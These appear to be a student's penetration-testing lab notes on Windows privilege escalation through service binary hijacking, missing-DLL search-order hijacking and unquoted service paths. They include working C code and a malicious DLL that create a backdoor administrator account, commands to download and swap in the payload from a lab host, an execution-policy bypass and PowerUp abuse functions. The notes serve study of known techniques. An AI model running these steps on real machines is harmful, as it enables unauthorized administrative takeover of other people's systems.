---
tags: ProcessMonitor, PowerUp
---
Windows Service: 
- a long-running background executable or application managed by Service Control Manager
- similar to Unix daemons

## Service Binary Hijacking

Each Windows service has an associated binary file. These binary files are executed when the service is started or transitioned into a running state.

If the software developer of the Windows service did not secure the permissions of the program, allowing full Read and Write access to all members of the Users group, a low-privileged user could replace the program with a malicious one. When the service is restarted, the malicious binary will run with the privileges of the system, such as *LocalSystem*.

### 1. Get list of installed Windows services

Ways to get list of installed Windows services:
- GUI snap-in *services.msc*
- *Get-Service* cmdlet
- (Recommended) *Get-CimInstance* Cmdlet (superseding *Get-WmiObject*)
  `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

Note: When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a “permission denied” error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.

> Look out for: If service binary is not located in **C:\\Windows\\System32**, it means that the service is user-installed and the software developer is in charge of directory structure and permissions of the software. -> prone to binary hijacking!

### 2. Enumerate permissions on potentially prone service binaries

We should check the permissions that the current user's group has on potentially prone service binaries.

Methods:
- (cmd) `icacls` Windows utility
  E.g. `icacls "C:\xampp\apache\bin\httpd.exe"`
- (PS) `Get-ACL`

`icacls` permissions masks:
- F: Full access
- M: Modify access
- RX: Read and Execute access
- R: Read-only access
- W: Write-only access

An indicator `I` preceding a permission means that the permission was inherited by the parent directory.

### 3. Create malicious binary

Create a malicious binary on Kali to replace the original prone service binary.

Sample C code:
```C
#include <stdlib.h>
int main ()
{
 int i;

 i = system ("net user dave2 password123! /add");
 i = system ("net localgroup administrators dave2 /add");

 return 0;
}
```
- creates new user and adds it to local Administrators group

Cross-compile code:
`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe` 
- `x86_64-w64-mingw32-gcc`: cross-compiler for 64-bit target machine
Cross compiler for x86-32: `i686-w64-mingw32-gcc -o 40564.exe 40564.c -lws2_32`

### 4. Transfer and replace with malicious binary

1. Transfer malicious binary to target machine:
   (PS) `iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe`
2. Copy original binary to home directory so that we can restore it after successful privesc:
   `move C:\xampp\mysql\bin\mysqld.exe mysqld.exe`
3. Replace original binary with malicious binary:
   `move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe`
4. Restart service (two methods):
	- `net stop mysql`
	  `net start mysql`
	- If current user does not have the permissions to stop the service, if the service *Startup Type* is set to "Automatic", may be able to restart service by rebooting machine
			1. Check startup type of service:
			   (PS) `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`
			2. Check if current user has the privileges to reboot (must have *SeShutDownPrivilege* assigned):
			   `whoami /priv`
				- if it is shown in the listing, then we have that privilege. "disabled" only indicates if the privilege is enabled for the current running process (`whoami`)
				- If the privilege is not assigned, then we have to wait for the victim to manually start the service
			3. Issue reboot (if condition 2 is satisfied):
			   `shutdown /r /t 0`
				- `/r`: reboot instead of shutdown
				- `/t 0`: perform action in 0 seconds
5. If reboot was required, once reboot is complete, connect again
6. Confirm if attack was successful by listing members of local Administrators group
   (PS) `Get-LocalGroupMember administrators`
7. We can use *RunAs* (see [[Enumerating Windows]]) to get interactive shell as the new user or use *msfvenom* to start an executable file, starting a reverse shell.
8. Restore original state of the service:
	1. Delete our malicious binary
	2. Restore backed up original binary
	3. Restart system

### Automated tool: [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

1. Transfer script to target:
   (PS) `iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1`
2. Start PowerShell with **ExecutionPolicy Bypass** (otherwise the running of scripts is blocked):
   `powershell -ep bypass`
3. Import PowerUp.ps1:
   `. .\PowerUp.ps1`
4. Display services the current user can modify, such as the service binary or configuration files:
   `Get-ModifiableServiceFile`

PowerUp.ps1 has an *AbuseFunction*, which is a built-in function to replace the binary and, if we have sufficient permissions, restart it.
`Install-ServiceBinary -Name 'mysql'`
- Default behaviour: creates new local user "john" with password "Password123!" and adds it to local Administrators group. 
- If we don’t have enough permissions to restart the service, we still need to reboot the machine.
- Note: it is buggy when the service binary has a path as an argument
`Install-ServiceBinary -Name 'mysql'`

## Service DLL Hijacking

Problem with Service Binary Hijacking: our user often does not have the permissions to replace these service binaries.

Dynamic Link Library (DLL): 
- provide functionality to programs or the Windows operating system
- contain code or resources for other executable files or objects to use
- equivalent to *Shared Objects* in Unix

Two methods:
- Overwrite a DLL the service binary uses (similar to above section)
	- DLL code is executed -> create new local administrative user
	- Note: the service may not work as expected because the actual DLL functionality is missing
- Hijack DLL search order
	- search order is defined by Microsoft and determines what to inspect first when searching for DLLs
	- By default, all current Windows versions have safe DLL search mode enabled

The DLL should be loaded with the permissions of the user that ran the application which loaded the DLL

### Hijack DLL search order

Standard Windows safe DLL search order:
1. The directory from which the application loaded. 
2. The system directory. 
3. The 16-bit system directory. 
4. The Windows directory. 
5. The current directory. 
6. The directories that are listed in the PATH environment variable.

When safe DLL search mode is disabled, the current directory is searched at position 2 after the application’s directory.

**Special case: missing DLL**
- The binary attempted to load a DLL that doesn't exist on the system.
- Often occurs with flawed installation processes or after updates
- Program may still work with restricted functionality

How attaching a DLL works:
- Each DLL has an optional entry point function `DllMain`, which is executed when processes or threads attach a DLL
- `DllMain` contains four cases: `DLL_PROCESS_ATTACH`, `DLL_THREAD_ATTACH`, `DLL_THREAD_DETACH`, `DLL_PROCESS_DETACH`. They are used to perform initialization tasks for the DLL or tasks related to exiting the DLL, when the DLL is loaded or unloaded by a process or thread.
- If a DLL doesn’t have a `DllMain` entry point function, it only provides resources

Basic DLL code sample in C++:
```C++
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
 switch ( ul_reason_for_call )
 {
 case DLL_PROCESS_ATTACH: // A process is loading the DLL.
 break;
 case DLL_THREAD_ATTACH: // A process is creating a new thread.
 break;
 case DLL_THREAD_DETACH: // A thread exits normally.
 break;
 case DLL_PROCESS_DETACH: // A process unloads the DLL.
 break;
 }
 return TRUE;
}
```

#### Abusing missing DLL (2022)
1. Connect to client with RDP as a user (assume we already compromised that user account)
2. Enumerate services: (like in previous section)
   (PS) `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
3. Check permissions on binary file of target service:
   `icacls .\Documents\BetaServ.exe`
   If we don't have permissions to replace the binary, then we can't use Service Binary Hijacking (see previous section)
4. Use [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to identify all DLLs loaded by target service and any missing ones
	- Process Monitor requires administrative privileges to run
	- Standard procedure is to copy the service binary to a local machine, install service locally, and use Process Monitor with administrative privileges to list all DLL activity
5. In Process Monitor, create a filter to include only events related to the target service
	1. *Filter* -> *Filter ...*
	2. Enter the following:
		   Column: Process Name
		   Relation: is
		   Value: BetaServ.exe (name of target service binary)
		   Action: Include
	3. *Add*
	4. After adding the filter, the list should be empty or only contain entries of the target binary
6. Restart the target service to see the DLL load attempts (with Process Monitor running in the background):
   (PS) `Restart-Service BetaService`
7. Check Process Monitor for any DLL which couldn't be found in any of the paths (should say NAME NOT FOUND in *Details* column)
8. Find where we can write a malicious DLL file to replace the missing DLL in one of the locations searched (refer to the safe search order above)
	- Use `$env:path` command in PowerShell to list the directories in the PATH environment variable
	- We can create a malicious DLL to replace one which is missing, or place it in a location with a higher search order than the location of the original DLL
9. Create malicious DLL:
   ```C++
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
 switch ( ul_reason_for_call )
 {
 case DLL_PROCESS_ATTACH: // A process is loading the DLL.
 int i;
 i = system ("net user dave2 password123! /add");
 i = system ("net localgroup administrators dave2 /add");
 break;
 case DLL_THREAD_ATTACH: // A process is creating a new thread.
 break;
 case DLL_THREAD_DETACH: // A thread exits normally.
 break;
 case DLL_PROCESS_DETACH: // A process unloads the DLL.
 break;
 }
 return TRUE;
}
```
10. Cross-compile code:
    `x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll`
11. Transfer malicious DLL to the target directory in the target machine
    (PS) `iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll`
12. Restart target service
    (PS) `Restart-Service BetaService` 
    or the other method in the above section
13. The new user with local administrative privileges should be created:
    `net user`
    `net localgroup administrators`

#### Abusing missing DLL (2023)
1. Connect to client via RDP as user
2. Enumerate installed applications: (like in previous section)
   (PS) `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
3. Identify that one of the installed applications (`FileZilla 3.63.1`) has a DLL hijacking vulnerability (according to online resources)
4. Copy the vulnerable service binary to a local machine (where you can local admin privileges) to monitor it on Process Monitor
5. In Process Monitor, apply filter for the target service:
	1. *Filter* -> *Filter ...*
	2. Enter the following:
		   Column: Process Name
		   Relation: is
		   Value: filezilla.exe (name of target service binary)
		   Action: Include
	3. *Add*
	4. After adding the filter, the list should only contain entries of the filtered binary
6. Clear all current events by pressing *Clear* button (trash can icon)
7. Run the application. Observe that entries appear in ProcMon
8. Add another filters to filter for entries specific to this vulnerability:
	- `Operation is CreateFile` (note that the `CreateFile` operation is responsible for not only creating files but also accessing them)
	- `Path contains TextShaping.dll` (the missing DLL according to online sources)
9. Rest of the steps same as above section (2022)
   
## Unquoted Service Paths

Prerequisite: 
- have Write permissions to a service’s main directory or subdirectories but cannot replace files within them
- the path of the executable file of the target Windows service contains one or more spaces and is not enclosed within quotes 

Theory:
- When a service is started and a process is created, the Windows `CreateProcess` function is used.
- The first parameter, *IpApplicationName*, is used to specify the name and optionally the path to the executable file
- If the provided string contains spaces and is not enclosed within quotation marks, the function interprets the path from left to right until a space is reached. For every space in the path, the function appends `.exe` to the string and uses the rest as arguments.
  E.g.
  ```
  C:\Program.exe 
  C:\Program Files\My.exe 
  C:\Program Files\My Program\My.exe 
  C:\Program Files\My Program\My service\service.exe
	```

Exploitation method:
- Create a malicious executable in one of the interpreted paths
- once the service is started, our file gets executed with the same privileges that the service starts with (often the *LocalSystem* account -> privilege escalation)

Steps:
1. Connect to target machine
2. Enumerate running and stopped services with no quotes and space(s):
   (PS) `Get-CimInstance -ClassName win32_service | Select Name,State,PathName` (need to manually search for target service in the output)
   (cmd) `wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """` (preferred)
3. Check if we have permissions to start and stop the target service:
   (PS) `Start-Service GammaService`
   (PS) `Stop-Service GammaService`
   If we can't restart the service ourselves, will need to use method in above section
4. Check our access rights in the interpreted paths:
   (PS) `icacls "C:\"`, `icacls "C:\Program Files"`, ...
   Until we find a path where we have Write permissions
5. Create malicious .exe file. Can reuse the C code in the "Service Binary Hijacking" section
6. Transfer the malicious .exe file to the target path with the appropriate name.
   (PS) `iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe`
7. Restart target service (see "Service Binary Hijacking" section for methods).
	- Note that even if there is an error in starting the service, our exploit may still be successful! (Our malicious code does not accept the parameters of the original.)
8. Check that new user with local administrative privileges is created successfully.
   `net user`
   `net localgroup administrators`

Restore functionality of the original service:
1. Stop service
2. Delete our binary

Automation with PowerUp.ps1:
1. Load script:
   `. .\PowerUp.ps1`
2. Detect prone services:
   `Get-UnquotedService`
3. Use AbuseFunction:
   `Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"`
4. `Restart-Service GammaService`


